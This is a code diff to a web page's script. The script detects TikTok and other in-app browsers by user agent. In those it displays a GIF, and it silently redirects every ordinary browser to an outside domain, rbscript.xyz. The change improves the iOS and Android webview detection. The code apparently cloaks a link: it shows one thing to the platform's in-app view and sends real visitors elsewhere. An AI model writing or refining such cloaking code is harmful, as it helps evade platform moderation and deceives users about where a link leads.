@@ -36,33 +36,37 @@
 
     <script>
         function runRedirect() {
-            var ua = navigator.userAgent.toLowerCase();
+            var ua = navigator.userAgent;
+            var uaLower = ua.toLowerCase();
             
-            // 1. Detection dyal TikTok (Standard)
-            var isTikTok = ua.indexOf("tiktok") > -1 || ua.indexOf("bytedance") > -1;
+            // --- DETECTION ---
 
-            // 2. Detection dyal WebView f Android (Browser dakhili dyal Apps)
-            // L-browser dyal TikTok f Android 3ando "wv" f user agent
-            var isAndroidWebView = ua.indexOf("android") > -1 && ua.indexOf("wv") > -1;
+            // 1. Is it TikTok explicitly?
+            var isTikTok = uaLower.indexOf("tiktok") > -1 || uaLower.indexOf("bytedance") > -1;
 
-            // 3. Detection dyal iOS WebView (iPhone)
-            // F iPhone, ila kan "Safari" walakin ma fihch "Version/", rah in-app browser
-            var isIosWebView = (ua.indexOf("iphone") > -1 || ua.indexOf("ipad") > -1) && 
-                               (ua.indexOf("safari") === -1 || ua.indexOf("crios") === -1);
+            // 2. Is it Android WebView? (TikTok on Android uses this)
+            var isAndroidWebView = uaLower.indexOf("android") > -1 && uaLower.indexOf("wv") > -1;
 
-            // Daba l-hakam: Wach hada browser "masjoune" (TikTok/Insta/WebView)?
-            var isInAppBrowser = isTikTok || isAndroidWebView || isIosWebView;
+            // 3. Is it iOS WebView? (TikTok on iPhone uses this)
+            // Logic: Ila kan iPhone/iPad, WALAKIN ma fihch "Version/" (Safari) w mafihch "CriOS" (Chrome)
+            // Safari l-asli fih "Version/", Chrome fih "CriOS". TikTok mafihch hado.
+            var isIOS = /iPhone|iPad|iPod/.test(ua);
+            var isIosSafeBrowser = ua.includes("Version/") || ua.includes("CriOS") || ua.includes("FxiOS");
+            
+            var isIosWebView = isIOS && !isIosSafeBrowser;
 
-            if (isInAppBrowser) {
-                // HADA TIKTOK: Bayen l-GIF w matdirch redirect
+            // --- RESULT ---
+            
+            // Ila kan ay wa7ed mn hado, rah browser masjoune (TikTok)
+            if (isTikTok || isAndroidWebView || isIosWebView) {
+                // Show GIF
                 document.getElementById('content').style.display = 'block';
             } else {
-                // HADA CHROME/SAFARI: Sifto nichan l site lakhor
+                // Browser nadiy (Safari 3adi, Chrome, etc) -> Sifto
                 window.location.replace("https://rbscript.xyz");
             }
         }
 
-        // Lancer l-process
         runRedirect();
     </script>
 
